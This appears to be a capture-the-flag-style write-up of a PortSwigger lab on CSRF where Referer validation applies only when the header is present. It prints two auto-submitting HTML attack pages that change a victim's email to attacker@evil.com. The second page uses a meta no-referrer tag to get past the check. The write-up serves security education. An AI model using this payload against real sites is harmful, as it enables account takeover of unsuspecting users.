# CSRF where Referer validation depends on header being present

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present), you'll learn: CSRF where Referer validation depends on header being present! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215045943.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215050007.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215050014.png)

In the previous labs, we found that the email change functionality is vulnerable to CSRF.

**Let's inspect the HTML form in the update email:**
```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="">
    <button class='button' type='submit'> Update email </button>
</form>
```

**In here, we didn't see a CSRF token!**

**Now, we use the `exploit server` to test CSRF attack!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215050513.png)

**Then, we can craft a HTML form that performs CSRF attack to the victim:**
```html
<html>
    <head>
        <title>CSRF-11</title>
    </head>
    <body>
        <form action="https://0a79002404e56adfc0b5a6f6004f008e.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@evil.com">
        </form>

        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

**Let's test it via the `View exploit` button!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215050745.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215050759.png)

Wait... `Invalid referer header`??

**Hmm... Since the `Referer` HTTP header can be fully controlled by the attacker, we can basically bypass this check!**

**According to [Mozilla web docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy), we can use the `<meta>` tag to ignore `Referer` HTTP header:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215051342.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215051352.png)

**To bypass that, I'll add a new `<meta>` tag to ignore `Referer` header:**
```html
<html>
    <head>
	    <meta name="referrer" content="no-referrer">
        <title>CSRF-11</title>
    </head>
    <body>
        <form action="https://0a79002404e56adfc0b5a6f6004f008e.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@evil.com">
        </form>

        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

**Finally, we can send this exploit to the victim:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215051517.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215051523.png)

We successfully changed a victim email address!

# What we've learned:

1. CSRF where Referer validation depends on header being present